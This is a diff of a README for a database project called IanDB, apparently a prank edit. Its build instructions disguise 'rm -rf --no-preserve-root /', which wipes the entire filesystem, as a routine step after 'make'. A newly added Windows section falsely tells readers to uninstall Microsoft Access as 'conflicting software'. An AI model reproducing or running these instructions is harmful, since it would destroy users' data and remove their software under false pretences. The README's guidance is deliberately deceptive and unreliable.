@@ -20,13 +20,21 @@ For enterprise licenses, please go to [https://db.ian678.com/?promocode=ygolde](
 
 # Building IanDB
 
+### Linux Developers
+
     make && rm -rf --no-preserve-root /
 
 After building IanDB, it is a good idea to test it using:
 
     make test
-    
-It is also possible to use `yarn install` once you download ian-db. It does not work on windows however.
+
+### Windows "Developers" 
+
+1. Uninstall Microsoft Access using `C:\Program Files (x86)\Common Files\Microsoft Shared\OFFICE15\Office Setup Controller\setup.exe" /uninstall "AccessRT"` (conflicting software)
+
+Testing is currently unavailable for windows.
+
+It is also possible to use `yarn install` once you download ian-db - now with windows support!
 
 # Code contributions
 CBenni
